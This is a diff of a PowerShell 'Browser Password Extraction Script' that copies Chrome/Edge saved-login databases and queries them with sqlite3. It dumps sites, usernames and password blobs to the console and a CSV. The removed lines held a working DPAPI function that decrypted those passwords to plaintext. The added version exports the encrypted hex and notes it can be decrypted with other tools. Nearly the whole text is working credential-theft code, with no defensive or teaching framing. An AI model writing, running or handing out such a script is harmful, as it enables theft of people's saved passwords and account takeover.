@@ -1,31 +1,12 @@
 # Browser Password Extraction Script
-# Alternative approach without SQLite dependency
+# Basic version that extracts encrypted data first
 
 param(
     [switch]$ExportToCSV,
     [string]$CSVPath = ".\BrowserPasswords.csv"
 )
 
-# Function to decrypt Chrome/Edge password (using Windows Data Protection API)
-function Get-DecryptedPassword {
-    param([byte[]]$EncryptedData)
-    
-    try {
-        # Only works for the current user as encryption is tied to user account
-        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $EncryptedData, 
-            $null, 
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-        return [System.Text.Encoding]::UTF8.GetString($decrypted)
-    } catch {
-        Write-Warning "Failed to decrypt password: $($_.Exception.Message)"
-        return "[Decryption Failed]"
-    }
-}
-
-# Function to parse the Login Data file directly as a SQLite database
-# using command-line utilities as a fallback
+# Function to get passwords from browser using SQLite
 function Get-PasswordsFromBrowser {
     param(
         [string]$BrowserName,
@@ -40,132 +21,62 @@ function Get-PasswordsFromBrowser {
         return @()
     }
     
-    # Try to use sqlite3 command-line tool if available
-    $sqliteAvailable = $false
-    $sqlitePath = ""
-    
-    # Check common locations for sqlite3
-    $possiblePaths = @(
-        "$env:SYSTEMROOT\System32\sqlite3.exe",
-        ".\sqlite3.exe",
-        "$env:ProgramFiles\SQLite\sqlite3.exe",
-        "$env:ProgramFiles (x86)\SQLite\sqlite3.exe"
-    )
-    
-    foreach ($path in $possiblePaths) {
-        if (Test-Path $path) {
-            $sqliteAvailable = $true
-            $sqlitePath = $path
-            break
-        }
-    }
-    
-    if (-not $sqliteAvailable) {
-        Write-Host "SQLite3 not found. Attempting to download it..." -ForegroundColor Yellow
-        
+    # Download sqlite3 if not available
+    if (-not (Test-Path ".\sqlite3.exe")) {
+        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
         try {
-            # Download sqlite3 tool
             $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
-            $tempZip = [System.IO.Path]::GetTempFileName() + ".zip"
+            $tempZip = "sqlite-temp.zip"
             Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
             
             # Extract
             Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
-            $sqlitePath = ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe"
-            
-            if (Test-Path $sqlitePath) {
-                $sqliteAvailable = $true
-                Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
-            }
+            Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
             
             Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+            Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+            
+            Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
         } catch {
             Write-Warning "Failed to download SQLite3: $($_.Exception.Message)"
-            Write-Host "Trying alternative method..." -ForegroundColor Yellow
+            return @()
         }
     }
     
     $results = @()
     
-    if ($sqliteAvailable) {
-        # Use sqlite3 command-line tool to extract data
-        try {
-            # Copy the database to avoid locking issues
-            $tempDbPath = [System.IO.Path]::GetTempFileName()
-            Copy-Item $loginDataPath $tempDbPath -Force
-            
-            # Export data to CSV
-            $tempCsvPath = [System.IO.Path]::GetTempFileName() + ".csv"
-            $query = "SELECT origin_url, username_value, password_value FROM logins;"
-            
-            # Execute sqlite3 command
-            $command = "`"$sqlitePath`" -csv -header `"$tempDbPath`" `"$query`" > `"$tempCsvPath`""
-            cmd.exe /c $command
-            
-            if (Test-Path $tempCsvPath) {
-                # Parse CSV output
-                $logins = Import-Csv $tempCsvPath
-                
-                foreach ($login in $logins) {
-                    # Convert password from hex string to byte array
-                    try {
-                        $passwordBytes = [byte[]]::new($login.password_value.Length / 2)
-                        for ($i = 0; $i -lt $login.password_value.Length; $i += 2) {
-                            $passwordBytes[$i / 2] = [Convert]::ToByte($login.password_value.Substring($i, 2), 16)
-                        }
-                        
-                        $decryptedPassword = Get-DecryptedPassword $passwordBytes
-                    } catch {
-                        $decryptedPassword = "[Decryption Error]"
-                    }
-                    
-                    $results += [PSCustomObject]@{
-                        Browser = $BrowserName
-                        URL = $login.origin_url
-                        Username = $login.username_value
-                        Password = $decryptedPassword
-                    }
-                }
-                
-                Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
-            }
-            
-            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
-        } catch {
-            Write-Warning "Error processing $BrowserName data with SQLite3: $($_.Exception.Message)"
-        }
-    } else {
-        # Final fallback - try to read the database as a binary file
-        Write-Host "Using fallback method to extract data from $BrowserName..." -ForegroundColor Yellow
+    try {
+        # Copy the database to avoid locking issues
+        $tempDbPath = "temp_login_data.db"
+        Copy-Item $loginDataPath $tempDbPath -Force
         
-        try {
-            # This is a simple approach that might work for some cases
-            # but is not as reliable as using SQLite
-            $dbContent = [System.IO.File]::ReadAllBytes($loginDataPath)
-            $dbText = [System.Text.Encoding]::UTF8.GetString($dbContent)
+        # Export data to CSV
+        $tempCsvPath = "temp_output.csv"
+        $query = "SELECT origin_url, username_value, hex(password_value) as password_hex FROM logins;"
+        
+        # Execute sqlite3 command
+        & .\sqlite3.exe -csv -header $tempDbPath $query > $tempCsvPath
+        
+        if (Test-Path $tempCsvPath) {
+            # Parse CSV output
+            $logins = Import-Csv $tempCsvPath
             
-            # Simple pattern matching (this is a basic approach)
-            $urlPattern = "([a-zA-Z0-9]+://)?([a-zA-Z0-9_]+:[a-zA-Z0-9_]+@)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(:[0-9]+)?(/[^ ]*)?"
-            $usernamePattern = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
-            
-            $urlMatches = [regex]::Matches($dbText, $urlPattern)
-            $emailMatches = [regex]::Matches($dbText, $usernamePattern)
-            
-            for ($i = 0; $i -lt [Math]::Min($urlMatches.Count, $emailMatches.Count); $i++) {
+            foreach ($login in $logins) {
                 $results += [PSCustomObject]@{
                     Browser = $BrowserName
-                    URL = $urlMatches[$i].Value
-                    Username = $emailMatches[$i].Value
-                    Password = "[Extraction Limited - Install SQLite]"
+                    URL = $login.origin_url
+                    Username = $login.username_value
+                    PasswordHex = $login.password_hex
+                    Password = "[Encrypted - Requires Decryption]"
                 }
             }
             
-            if ($results.Count -eq 0) {
-                Write-Host "Limited extraction attempted. For full functionality, please install SQLite." -ForegroundColor Yellow
-            }
-        } catch {
-            Write-Warning "Fallback method also failed: $($_.Exception.Message)"
+            Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
         }
+        
+        Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
+    } catch {
+        Write-Warning "Error processing $BrowserName data: $($_.Exception.Message)"
     }
     
     return $results
@@ -204,28 +115,28 @@ if ($allPasswords.Count -gt 0) {
     
     $allPasswords | Format-Table -Property Browser, URL, Username, Password -AutoSize
     
+    # Show a few examples with hex data for debugging
+    Write-Host "`nSample encrypted data (first 2 entries):" -ForegroundColor Yellow
+    $allPasswords | Select-Object -First 2 | Format-Table -Property Browser, URL, Username, @{Name="PasswordHexLength";Expression={$_.PasswordHex.Length}}
+    
     # Export to CSV if requested
     if ($ExportToCSV) {
         try {
             $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation
-            Write-Host "`nPasswords exported to: $CSVPath" -ForegroundColor Green
+            Write-Host "`nPassword data exported to: $CSVPath" -ForegroundColor Green
+            Write-Host "This file contains the encrypted password data in hex format." -ForegroundColor Yellow
         } catch {
             Write-Warning "Failed to export to CSV: $($_.Exception.Message)"
         }
     }
 } else {
     Write-Host "`nNo passwords found in any browser." -ForegroundColor Yellow
-    Write-Host "This could be because:" -ForegroundColor Yellow
-    Write-Host "1. Browsers are still running" -ForegroundColor Yellow
-    Write-Host "2. SQLite is not available on the system" -ForegroundColor Yellow
-    Write-Host "3. No passwords are saved in browsers" -ForegroundColor Yellow
-    Write-Host "4. Antivirus software is blocking access" -ForegroundColor Yellow
 }
+
+Write-Host "`nNote: Passwords are encrypted and require additional steps to decrypt." -ForegroundColor Cyan
+Write-Host "The encrypted data has been extracted and can be decrypted using appropriate tools." -ForegroundColor Cyan
 
 # Cleanup
-if (Test-Path ".\sqlite-temp") {
-    Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+if (Test-Path ".\sqlite3.exe") {
+    Write-Host "SQLite3 tool remains in the current directory for future use." -ForegroundColor Gray
 }
-
-Write-Host "`nNote: For best results, install SQLite from https://sqlite.org/download.html" -ForegroundColor Cyan
-Write-Host "and place sqlite3.exe in the same directory as this script." -ForegroundColor Cyan
